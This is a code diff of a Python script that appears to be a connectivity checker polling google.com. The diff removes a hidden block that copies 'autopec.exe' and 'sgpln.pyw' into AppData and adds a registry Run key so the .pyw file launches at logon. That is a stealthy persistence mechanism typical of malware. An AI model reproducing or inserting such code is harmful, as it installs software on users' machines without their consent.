@@ -7,19 +7,6 @@ import threading, time, requests
 from datetime import datetime
 import os, shutil, subprocess
 
-rscript='autopec.exe'
-rscript2='sgpln.pyw'
-user=os.getlogin()
-rt=f'C:\\Users\\{user}\\AppData\\autopec.exe'
-rt2=f'C:\\Users\\{user}\\AppData\\sgpln.pyw'
-if not os.path.exists(rt):
- shutil.move(rscript, rt)
-if not os.path.exists(rt2):
- shutil.move(rscript2, rt2)
-
-
-reg=f'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v autopec /t REG_SZ /d {rt2} /f'
-subprocess.run(reg, shell=True)
 url = "https://www.google.com"
 while True:
  try:
